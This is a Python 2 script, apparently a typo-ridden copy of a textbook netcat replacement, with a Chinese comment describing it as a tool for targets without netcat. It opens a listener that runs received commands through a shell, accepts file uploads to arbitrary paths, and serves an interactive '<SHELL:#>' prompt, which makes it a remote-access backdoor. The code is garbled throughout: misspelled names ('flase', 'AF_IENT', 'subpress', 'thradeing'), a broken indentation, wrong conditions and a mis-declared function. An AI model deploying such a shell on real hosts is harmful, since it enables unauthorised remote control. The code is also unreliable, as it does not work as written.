 # -*- coding: utf-8 -*-
"""
Spyder Editor

This temporary script file is located here:
C:\Users\Administrator\.spyder2\.temp.py
此工具在目标没有安装netcat的情况下，功能类似的小工具

"""
import sys
import socket
import getopt
import threading
import subprocess

listen              =flase
command             =flase
uplaoad             =flase
target              =flase
execute             =""
target              =""
upload_destination  =""
port                =0


def usage():
    print "SHELL Net Tool"
    print
    print "Usage shellnet.py -t target_host -p port"
    print "-l --lesten"
    print "-e --execute=file_to_run"
    print "-c --command"
    print "-u --upload_destination"
    
    print
    print 
    print "Examples: "
    print "shellnet.py -t 192.168.1.1 -p 9999 -l -c"
    print "shellnet.py -t 192.168.1.1 -p 5555 -l -u=c::\\target.exe"
    sys.exit(0)
        
def main():
    global listen
    global port
    global execute
    global command
    global upload_destation
    global target
    
    if not len(sys.argv[1:]):
       usage()
       #获取参数
    try:
        opts,args=getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","port","execute","target","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhadled Option"     
     if not listen and len(listen) and port > 0:
         
         buffer = sys.stdin.read()
         
         client_sender(buffer)
         
     if listen:
         server_loop()
   

def client_sender(buffer):
    client = socket.socket(socket.AF_IENT,socket.SOCK_STREAM)
    
    try:
        
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
            
        while True:
            
            recv_len = 1
            response = ""
            
            while recv_len:
                
                date        =client.recv(4096)
                recv_len = len (data)
                response += data
                
                if recv_len <4096:
                    break
                
            print response,
            
            buffer =raw_input("")
            buffer += "\n"
            
            client.send(buffer)
    except:
        print "[*] Exception! Exting."
        client.close()
def server_loop():
    global target
    
    if not len(target):
        target = "0.0.0.0"
        
    server = socket.socket(socket.AF_IENT,SOCK_STREAM)
    server = bind((target,port))
    
    server = listen(5)
    
    while True:
        client_socket, adder = server.accept()
        
        client_thread = thradeing.thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command():
    command = command.rstrip()
    try:
        output = subpress.check_output(command,stderr = subpress.STDOUT,shell=True)
    
    except:
        output = "Failed to execute command \r\n"
        
    return output

def client_handler(client_socket):
    global upload 
    global execute
    global command
    
    if len(upload_destination):
        
        file_buffer = ""
        
        while True:
            data = client_socket.recv(1024)
            
            if not data:
                break
    else:
        file_buffer += data
    
    try:
        file_descriptor = open(upload_destination,"wb")
        file_descriptor.write(file_buffer)
        file_descriptor.close()
        
        
        client_socket.send("Sessacefully saved file to %s\r\n" %upload_destination)
    except:
        client_socket.send("Failed to save file to %s \r\n" %upload_destination)
    

    if len(excute):
        output = run_command(excute)
        client_socket.send(output)
    
    if command:
        while True:
            
            client_socket.send("<SHELL:#>")
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer +=client_socket.recv(1024)
                
                response = run_command(cmd_buffer)
                
                client_socket.send(response)
    
